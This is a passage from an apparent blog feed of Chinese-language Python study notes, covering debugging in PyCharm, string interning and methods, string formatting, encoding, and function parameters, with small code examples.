class="hljs-variable">traceback.print_exc</span>()<br></code></pre></td></tr></tbody></table></figure><h1 id="PyCharm开发环境的调试"><a href="#PyCharm开发环境的调试" class="headerlink" title="PyCharm开发环境的调试"></a>PyCharm开发环境的调试</h1><p>1.断点：程序运行到此处暂时挂起，停止执行</p><p>2.调试视图：</p><p>（1）工具栏按钮：运行三角键右侧蜘蛛样式</p><p>（2）右键编辑区：debug’模块名’</p><p>（3）shift+F9</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Bug&quot;&gt;&lt;a href=&quot;#Bug&quot; class=&quot;headerlink&quot; title=&quot;Bug&quot;&gt;&lt;/a&gt;Bug&lt;/h1&gt;&lt;p&gt;1.常见类型&lt;/p&gt;
&lt;p&gt;(1)语法错误：SyntaxError&lt;/p&gt;
&lt;p&gt;(2)索引越界问题：IndexError&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习6</title>
    <link href="https://sinky.top/2022/09/16/python%E5%AD%A6%E4%B9%A06/"/>
    <id>https://sinky.top/2022/09/16/python%E5%AD%A6%E4%B9%A06/</id>
    <published>2022-09-16T12:35:21.580Z</published>
    <updated>2022-09-19T05:16:18.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>python基本数据类型，不可变字符序列</p><h2 id="驻留机制"><a href="#驻留机制" class="headerlink" title="驻留机制"></a>驻留机制</h2><p>仅保存一份相同且不可变字符串的方法。</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=<span class="hljs-string">'python'</span><br>b=<span class="hljs-string">'python'</span><br>c=<span class="hljs-string">'python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a,id(a)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b,id(b)</span></span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(c,id(c)</span></span>)<span class="hljs-selector-id">#python</span> <span class="hljs-number">2381469127728</span><br></code></pre></td></tr></tbody></table></figure><p>驻留机制的几种情况（交互模式）</p><ul><li>字符串的长度为0或1时</li><li>符合标识符的字符串</li><li>字符串只在编译时进行驻留，而非运行时</li><li>[-5,256] 之间的整数数字</li></ul><blockquote><p>sys中的intern方法强留2个字符串指向同一个对象；<br>pycharm对字符串进行了优化处理</p></blockquote><h2 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h2><h3 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h3><ul><li>index() 查找子串第一次出现的位置，若不存在返回ValueError</li><li>rindex() 查找子串最后一次出现的位置，若不存在返回ValueError</li><li>find() 查找子串第一次出现的位置，若不存在返回-1</li><li>rfind() 查找子串最后一次出现的位置，若不存在返回-1</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s=<span class="hljs-string">'hello,hello'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.index(<span class="hljs-string">'lo'</span>)</span></span>) #<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.rindex(<span class="hljs-string">'lo'</span>)</span></span>)#<span class="hljs-number">9</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.find(<span class="hljs-string">'lo'</span>)</span></span>)#<span class="hljs-number">3</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.rfind(<span class="hljs-string">'lo'</span>)</span></span>)#<span class="hljs-number">9</span><br></code></pre></td></tr></tbody></table></figure><h3 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h3><ul><li>upper() 所有字母转大写</li><li>lower() 所有字母转小写</li><li>swapcase() 大写转小写，小写转大写</li><li>capitalize() 首字母大写，其余小写</li><li>title() 每个单词首字母大写，剩余字符转小写</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s=<span class="hljs-string">'hello,Python'</span><br>a=s<span class="hljs-selector-class">.upper</span>()#转后产生新的字符串<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a)</span></span><span class="hljs-selector-id">#HELLO</span>,PYTHON <br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a,id(a)</span></span>) #<span class="hljs-number">1810982406960</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s,id(s)</span></span>) <span class="hljs-selector-id">#hello</span>,Python <span class="hljs-number">1810982405680</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.lower()</span></span>)<span class="hljs-selector-id">#hello</span>,python 转后产生新的字符串<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'------'</span>)</span></span><br>b=s<span class="hljs-selector-class">.lower</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b,id(b)</span></span>) <span class="hljs-selector-id">#hello</span>,python <span class="hljs-number">1810996753072</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s,id(s)</span></span>) <span class="hljs-selector-id">#hello</span>,Python <span class="hljs-number">1810982398768</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b == s)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b is s)</span></span><span class="hljs-selector-id">#False</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'------'</span>)</span></span><br>s2=<span class="hljs-string">'hello,Python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.swapcase()</span></span>) <span class="hljs-selector-id">#HELLO</span>,pYTHON<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s2.title()</span></span>)<span class="hljs-selector-id">#Hello</span>,Python<br></code></pre></td></tr></tbody></table></figure><h3 id="内容对齐"><a href="#内容对齐" class="headerlink" title="内容对齐"></a>内容对齐</h3><ul><li>center() 居中对齐，center([宽度],[填充符])</li><li>ljust 左对齐</li><li>rjust 右对齐</li><li>zfill() 右对齐，左边以0填充，zfill([宽度])</li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">'hello,Python'</span><br><span class="hljs-built_in">print</span>(s.center(20,<span class="hljs-string">'*'</span>))#****hello,Python****<br><span class="hljs-built_in">print</span>(s.ljust(20,<span class="hljs-string">'*'</span>))#hello,Python********<br><span class="hljs-built_in">print</span>(s.ljust(10))#hello,Python 宽度小于字符串本身，则返回字符串本身<br><span class="hljs-built_in">print</span>(s.rjust(20,<span class="hljs-string">'*'</span>))#********hello,Python<br><span class="hljs-built_in">print</span>(s.rjust(20))#        hello,Python<br><span class="hljs-built_in">print</span>(s.zfill(20))#00000000hello,Python<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'-8910'</span>.zfill(8))#-0008910<br></code></pre></td></tr></tbody></table></figure><h3 id="劈分"><a href="#劈分" class="headerlink" title="劈分"></a>劈分</h3><ul><li>split() 从字符串左边开始劈分，默认以空格劈分，返回结果为列表；以参数sep指定分隔符；以参数maxsplit指定分隔最大次数</li><li>rsplit() 从右边开始劈分</li></ul><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s=<span class="hljs-string">'hello world Python'</span><br>l=s<span class="hljs-selector-class">.split</span>()<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(l)</span></span>#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-string">'Python'</span>]</span><br>s1=<span class="hljs-string">'hello|world|Python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.split(sep=<span class="hljs-string">'|'</span>)</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-string">'Python'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.split(sep=<span class="hljs-string">'|'</span>,maxsplit=<span class="hljs-number">1</span>)</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world|Python'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s.split()</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>, <span class="hljs-string">'Python'</span>]</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(s1.rsplit(sep=<span class="hljs-string">'|'</span>,maxsplit=<span class="hljs-number">1</span>)</span></span>)#<span class="hljs-selector-attr">[<span class="hljs-string">'hello|world'</span>, <span class="hljs-string">'Python'</span>]</span><br></code></pre></td></tr></tbody></table></figure><h3 id="判断字符串操作"><a href="#判断字符串操作" class="headerlink" title="判断字符串操作"></a>判断字符串操作</h3><ul><li>isidentifier() 是否合法标识符（字母数字下划线）</li><li>isspace() 是否全是空格</li><li>isalpha() 是否全是字母</li><li>isdecimal() 是否全是十进制数字</li><li>isnumeric() 是否全是数字</li><li>isalnum() 是否全是数字和字母组成</li></ul><h3 id="替换合并"><a href="#替换合并" class="headerlink" title="替换合并"></a>替换合并</h3><ul><li>replace() 字符串替换</li><li>join() 河滨，列表或元组中字符串合并为一个字符串</li></ul><figure class="highlight axapta"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs axapta">s=<span class="hljs-string">'hello,Python'</span><br><span class="hljs-keyword">print</span>(s.replace(<span class="hljs-string">'Python'</span>,<span class="hljs-string">'Java'</span>))<span class="hljs-meta">#hello,Java</span><br>s1=<span class="hljs-string">'hello,Python,Python,Python'</span><br><span class="hljs-keyword">print</span>(s.replace(<span class="hljs-string">'Python'</span>,<span class="hljs-string">'Java'</span>,<span class="hljs-number">2</span>))<span class="hljs-meta">#hello,Java</span><br>lst=[<span class="hljs-string">'hello'</span>,<span class="hljs-string">'java'</span>,<span class="hljs-string">'python'</span>]<br><span class="hljs-keyword">print</span>(<span class="hljs-string">'|'</span>.<span class="hljs-keyword">join</span>(lst))<span class="hljs-meta">#hello|java|python</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>(lst))<span class="hljs-meta">#hellojavapython</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">'*'</span>.<span class="hljs-keyword">join</span>(<span class="hljs-string">'Python'</span>))<span class="hljs-meta">#P*y*t*h*o*n</span><br></code></pre></td></tr></tbody></table></figure><h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p>运算符<code>&gt; &gt;= &lt; &lt;= == !=</code></p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'apple'</span>&gt;<span class="hljs-string">'app'</span>)</span></span><span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'apple'</span>&gt;<span class="hljs-string">'banana'</span>)</span></span><span class="hljs-selector-id">#False</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(ord(<span class="hljs-string">'a'</span>)</span></span>,<span class="hljs-built_in">ord</span>(<span class="hljs-string">'b'</span>))#<span class="hljs-number">97</span> <span class="hljs-number">98</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(chr(<span class="hljs-number">97</span>)</span></span>,<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>))<span class="hljs-selector-id">#a</span> b<br></code></pre></td></tr></tbody></table></figure><p>‘==’ 比较 value</p><p>‘is’ 比较 id</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">a=b=<span class="hljs-string">'Python'</span><br>c=<span class="hljs-string">'Python'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(a==b)</span></span><span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(b==c)</span></span><span class="hljs-selector-id">#True</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(id(a)</span></span>,<span class="hljs-built_in">id</span>(b),<span class="hljs-built_in">id</span>(c))#<span class="hljs-number">1621331059952</span> <span class="hljs-number">1621331059952</span> <span class="hljs-number">1621331059952</span><br></code></pre></td></tr></tbody></table></figure><h3 id="切片-start-end-step"><a href="#切片-start-end-step" class="headerlink" title="切片 [start:end:step]"></a>切片 [start<span class="github-emoji"><span>🔚</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f51a.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>step]</h3><p>字符串不可变，切片后将产生新对象</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">'hello,python'</span><br><span class="hljs-attribute">s1</span>=s[:5]<br><span class="hljs-attribute">s2</span>=s[6:]<br><span class="hljs-attribute">s3</span>=<span class="hljs-string">'!'</span><br><span class="hljs-attribute">newstr</span>=s1+s3+s2<br><span class="hljs-built_in">print</span>(s1)#hello<br><span class="hljs-built_in">print</span>(s2)#python<br><span class="hljs-built_in">print</span>(s3)#!<br><span class="hljs-built_in">print</span>(newstr)#hello!python<br></code></pre></td></tr></tbody></table></figure><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><ul><li>%作占位符 <code>'我叫%s'%(name)</code></li><li>{}作占位符 <code>'我叫{0},今年{1}岁，我真的是{0}'.format(name,age)</code></li></ul><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">name</span>=<span class="hljs-string">'张三'</span><br><span class="hljs-attribute">age</span>=20<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'我叫%s,今年%d岁'</span>%(name,age))#我叫张三，今年20岁<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'我叫{0},今年{1}岁'</span>.format(name,age))<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">'我叫{name},今年{age}岁'</span>)<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">print</span>('%<span class="hljs-number">10</span>d'%<span class="hljs-number">99</span>)#        <span class="hljs-number">99</span>;<span class="hljs-number">10</span>表示宽度<br><span class="hljs-attribute">print</span>('%.<span class="hljs-number">3</span>f'%<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>)#<span class="hljs-number">3</span>.<span class="hljs-number">142</span>；#.<span class="hljs-number">3</span>表示小数点后三位<br><span class="hljs-attribute">print</span>('%<span class="hljs-number">10</span>.<span class="hljs-number">3</span>f'%<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>)#     <span class="hljs-number">3</span>.<span class="hljs-number">142</span><br><span class="hljs-attribute">print</span>(' ---- ')<br><span class="hljs-attribute">print</span>('{<span class="hljs-number">0</span>:.<span class="hljs-number">3</span>f}'.format(<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>)) #<span class="hljs-number">3</span>.<span class="hljs-number">142</span><br><span class="hljs-attribute">print</span>('{<span class="hljs-number">0</span>:<span class="hljs-number">10</span>.<span class="hljs-number">3</span>f}'.format(<span class="hljs-number">3</span>.<span class="hljs-number">1415926</span>))#     <span class="hljs-number">3</span>.<span class="hljs-number">142</span><br></code></pre></td></tr></tbody></table></figure><h2 id="编码转换"><a href="#编码转换" class="headerlink" title="编码转换"></a>编码转换</h2><p>编码：字符串转二进制</p><p>解码：二进制转字符串</p><p>GBK中，一个中文占两个字节；UTF-8中，一个中文占三个字节</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">s</span>=<span class="hljs-string">'天涯共此时'</span><br><span class="hljs-built_in">print</span>(s.encode(<span class="hljs-attribute">encoding</span>=<span class="hljs-string">'GBK'</span>))#b'\xcc\xec\xd1\xc4\xb9\xb2\xb4\xcb\xca\xb1'<br><span class="hljs-attribute">byte</span>=s.encode(encoding='GBK')<br><span class="hljs-built_in">print</span>(byte.decode(<span class="hljs-attribute">encoding</span>=<span class="hljs-string">"GBK"</span>))#天涯共此时<br></code></pre></td></tr></tbody></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="创建，调用"><a href="#创建，调用" class="headerlink" title="创建，调用"></a>创建，调用</h2><p>（1）函数作用：复用代码，隐藏实现细节，提高可维护性，提高可读性便于调试</p><p>（2）创建：<code>def 函数名([参数]):</code><br>                <code>函数体</code></p><p>（3）调用：</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">def calc(<span class="hljs-keyword">a</span>,b): <span class="hljs-comment">#a,b为形参，在函数定义处</span><br>    c=<span class="hljs-keyword">a</span>+b<br>    <span class="hljs-literal">return</span> c<br><span class="hljs-built_in">result</span>=calc(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>) <span class="hljs-comment">#10，20是实参，在函数调用处</span><br>print(<span class="hljs-built_in">result</span>) <span class="hljs-comment">#30</span><br></code></pre></td></tr></tbody></table></figure><h2 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h2><p>（1）位置实参：对应位置进行参数传递</p><p>（2）关键字实参：对应名称进行参数传递</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">result</span>=calc(<span class="hljs-keyword">a</span>=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>)<br>print(<span class="hljs-built_in">result</span>) <span class="hljs-comment">#30</span><br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(arg1,arg2):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg1'</span>,arg1)#arg1 11<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg2'</span>,arg2)#arg2 [22, 33, 44]<br>    <span class="hljs-attribute">arg1</span>=100<br>    arg2.append(10)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg1'</span>,arg1)#arg1 100<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'arg2'</span>,arg2)#arg2 [22, 33, 44, 10]<br><span class="hljs-attribute">n1</span>=11<br>n2=[22,33,44]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n1'</span>,n1)#n1 11<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n2'</span>,n2)#n2 [22, 33, 44]<br>fun(n1,n2)#跳到fun()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n1'</span>,n1)#n1 11<br><span class="hljs-built_in">print</span>(<span class="hljs-string">'n2'</span>,n2)#n2 [22, 33, 44, 10]<br></code></pre></td></tr></tbody></table></figure><blockquote><p>在函数调用过程中，进行参数传递，若是不可变对象，在函数体的修改不会影响实参的值；若可变则会影响</p></blockquote><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>（1）返回值有多个时，结果将以元组形式返回</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(num)</span></span>:<br>    odd=[]#存储奇数<br>    even=[]#存储偶数<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> num:<br>        <span class="hljs-keyword">if</span> i %<span class="hljs-number">2</span>:<br>            odd.append(i)<br>        <span class="hljs-keyword">else</span>:<br>            even.append(i)<br>    <span class="hljs-keyword">return</span> odd,even<br>lst=[<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">39</span>,<span class="hljs-number">43</span>,<span class="hljs-number">66</span>,<span class="hljs-number">24</span>]<br>print(<span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(lst)</span></span>)#([<span class="hljs-number">39</span>, <span class="hljs-number">43</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">66</span>, <span class="hljs-number">24</span>])<br></code></pre></td></tr></tbody></table></figure><p>（2）如果返回值没有（函数执行后不需要给调用出提供数据），return可省略；</p><p>若返回值为1个，则直接返回类型；</p><p>若返回值为多个，则返回为元组；</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">fun1</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'hello'</span>)<br><span class="hljs-built_in">fun1</span>()#hello<br>def <span class="hljs-built_in">fun2</span>():<br>    return <span class="hljs-string">'hello'</span><br>result=<span class="hljs-built_in">fun2</span>()<br><span class="hljs-built_in">print</span>(result)#hello<br>def <span class="hljs-built_in">fun3</span>():<br>    return <span class="hljs-string">'hello'</span>,<span class="hljs-string">'world'</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">fun3</span>())#(<span class="hljs-string">'hello'</span>, <span class="hljs-string">'world'</span>)<br></code></pre></td></tr></tbody></table></figure><h2 id="参数定义"><a href="#参数定义" class="headerlink" title="参数定义"></a>参数定义</h2><p>（1）默认值</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(a,b=<span class="hljs-number">10</span>)</span></span>:<br>    print(a,b)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">100</span>)</span></span>#<span class="hljs-number">100</span> <span class="hljs-number">10</span><br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">20</span>,<span class="hljs-number">30</span>)</span></span>#<span class="hljs-number">20</span> <span class="hljs-number">30</span><br></code></pre></td></tr></tbody></table></figure><p>（2）个数可变的位置参数（只可为一个），用*定义可变的形参，结果为元组</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(*args)</span></span>:<br>    print(args)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span>#(<span class="hljs-number">10</span>,)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">30</span>)</span></span>#(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>)<br></code></pre></td></tr></tbody></table></figure><p>（3）个数可变的关键字形参（只可为一个），用**定义可变的形参，结果为字典</p><figure class="highlight kotlin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">def <span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(**args)</span></span>:<br>    print(args)<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(a=<span class="hljs-number">10</span>)</span></span>#{<span class="hljs-string">'a'</span>: <span class="hljs-number">10</span>}<br><span class="hljs-function"><span class="hljs-title">fun</span><span class="hljs-params">(a=<span class="hljs-number">10</span>,b=<span class="hljs-number">20</span>,c=<span class="hljs-number">30</span>)</span></span>#{<span class="hljs-string">'a'</span>: <span class="hljs-number">10</span>, <span class="hljs-string">'b'</span>: <span class="hljs-number">20</span>, <span class="hljs-string">'c'</span>: <span class="hljs-number">30</span>}<br></code></pre></td></tr></tbody></table></figure><blockquote><p>函数定义中，二者同为形参时，位置参数放在关键字参数之前</p></blockquote><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(a,b,c):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'a='</span>,a)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'b='</span>,b)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'c='</span>,c)<br>fun(10,20,30)#位置传参#<span class="hljs-attribute">a</span>=10 <span class="hljs-attribute">b</span>=20 <span class="hljs-attribute">c</span>=30<br>lst=[11,22,33]<br>fun(*lst)#列表中元素转位置参数传入#<span class="hljs-attribute">a</span>=11 <span class="hljs-attribute">b</span>=22 <span class="hljs-attribute">c</span>=33<br>fun(<span class="hljs-attribute">a</span>=100,b=200,c=300)#a=100 <span class="hljs-attribute">b</span>=200 <span class="hljs-attribute">c</span>=300<br>dict={<span class="hljs-string">'a'</span>:111,<span class="hljs-string">'b'</span>:222,<span class="hljs-string">'c'</span>:333}<br>fun(*<span class="hljs-number">*d</span>ict)#字典中键值对转关键字参数传入#<span class="hljs-attribute">a</span>=111 <span class="hljs-attribute">b</span>=222 <span class="hljs-attribute">c</span>=333<br></code></pre></td></tr></tbody></table></figure><p>eg:</p><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">def fun(a,<span class="hljs-attribute">b</span>=10):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'a='</span>,a)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">'b='</span>,b)<br>def fun2(<span class="hljs-number">*a</span>rgs):<br>    <span class="hljs-built_in">print</span>(args)<br>def fun3(*<span class="hljs-number">*a</span>rgs):<br>    <span class="hljs-built_in">print</span>(args)<br>fun2(10,20,30,40)#(10, 20, 